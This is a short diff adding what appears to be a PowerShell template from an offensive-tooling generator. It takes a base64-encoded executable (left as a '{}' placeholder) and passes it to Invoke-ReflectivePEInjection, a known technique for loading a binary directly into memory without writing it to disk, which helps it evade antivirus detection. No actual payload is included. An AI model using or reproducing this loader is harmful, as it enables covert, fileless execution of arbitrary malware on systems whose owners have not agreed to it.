@@ -1,0 +1,8 @@
+param($arguments="")
+
+$InputString = '{}'
+ 
+{}
+ 
+$PEBytes = [System.Convert]::FromBase64String($InputString)
+Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $arguments
